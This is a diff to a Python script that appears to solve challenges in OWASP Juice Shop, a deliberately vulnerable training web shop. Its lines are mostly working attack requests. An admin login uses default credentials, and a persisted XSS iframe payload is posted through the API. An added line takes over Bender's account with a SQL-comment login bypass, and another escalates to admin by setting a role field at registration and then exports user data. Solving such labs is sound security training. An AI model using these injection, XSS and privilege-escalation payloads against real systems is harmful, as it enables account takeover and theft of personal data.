@@ -117,6 +117,8 @@ requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captch
 login=loads(requests.post(url+'/rest/user/login', data={'email':'admin@juice-sh.op','password':'admin123'}).text)['authentication']
 # ---- API-only XSS (Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> without using the frontend application at all.)
 requests.post(url+'/api/Products', data={'name':'XSS','description':'<iframe src="javascript:alert(`xss`)">','price':47.11}, headers={'Authorization':'Bearer '+login['token']})
+# ---- Change Bender's Password (Change Bender's password into slurmCl4ssic without using SQL Injection or Forgot Password.)
+requests.get(url+'/rest/user/change-password', params={'new':'slurmCl4ssic','repeat':'slurmCl4ssic'}, headers={'Authorization':'Bearer '+(loads(requests.post(url+'/rest/user/login',data={'email':'bender@juice-sh.op\';--','password':'a'}).text)['authentication']['token'])})
 # ---- GDPR Data Theft (Steal someone else's personal data without using Injection.)
 requests.post(url+'/api/Users',data={'email':'edmin@juice-sh.op','password':'edmin123','role':'admin'})
 requests.post(url+'/rest/user/data-export',data={'format':'1'},headers={'Authorization':'Bearer '+(loads(requests.post(url+'/rest/user/login',data={'email':'edmin@juice-sh.op','password':'edmin123'}).text)['authentication']['token'])})
